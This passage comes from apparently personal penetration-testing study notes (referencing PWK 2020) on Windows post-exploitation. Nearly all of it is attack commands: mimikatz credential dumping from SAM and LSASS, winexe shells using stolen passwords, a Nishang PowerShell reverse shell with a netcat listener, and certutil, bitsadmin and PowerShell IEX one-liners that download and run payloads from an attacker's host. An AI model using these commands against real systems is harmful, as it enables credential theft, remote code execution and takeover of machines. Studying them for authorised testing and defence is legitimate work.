				token::elevate
				lsadump::sam => dump SAM
				sekurlsa::minidump c:\users\whoami\desktop\lsass.dmp => dump lsass
				sekurlsa::logonPasswords full => Grabbing Clear Text Passwords From Memory
		Note:
			mimikatz is arch-dependent and has two versions available, x86 and x64.
		Note:
			we need privileges to run mimikatz
	Once we get the creds:
		If we have hash:
			pass-the-hash => Read in "Active Directory"
		If we have cleartext creds:
			winexe:
				winexe -U 'admin%pass' //ip cmd.exe => gives admin shell
				winexe -U 'admin%pass' --system //ip cmd.exe => gives system shell
Nishang:
	it is a collection of powershell scripts which helps in getting a powershell reverse shell
	shells/Invoke-PoweshellTcp:
		append in it:
			Invoke-PoweshellTcp -Reverse -IPAddress tun0 -port 5566
		nc -nvlp 5566
		and somehow transfer it to shell of victim using IEX in Powershell, it will execute on it own after downloading.
Winrm Pentesting: see Active information gathering
file transfer:
	Downloadind and Sending files from windows:
		Using ftp:
			kali> python3 -m pyftpdlib -p 21 --write
			cmd>ftp my_ip
				ftp> user:anonymous
				ftp> password:anonymous
				ftp> put file.exe
				Note:
					windows has inbuilt ftp
		Using smb: Covered in SMB Server For Pentesting sheet
	Downloading files:
		cmd:
			certutil -urlcache -f http://ip/filename outfile_name
				-f => file
			bitsadmin /transfer transfName /priority high http://abcd.com/file.pdf C:\downloads\file.pdf
		powershell
			powershell -c (New-Object Net.WebClient).DownloadFile('http://ip/filename', 'savename')
			powershell IEX(New-Object Net.WebClient).downloadstring('http://ip:port/filename')
		wget.vbs:
			in pwk2020 folder
			we can make it in victim by following comds on page 483 pwk2020
			cscript wget.vbs http://ip/filename savename
Tools for Remote Execution:
	Can be used in ptp/pth
	psexec.py: Read in Active Directory sheet	
	smbexec.py: Read in Active Directory sheet	
	atexec.py: Read in Active Directory sheet	
	wmiexec.py: Read in Active Directory sheet	
	dcomexec.py: Read in Active Directory sheet	
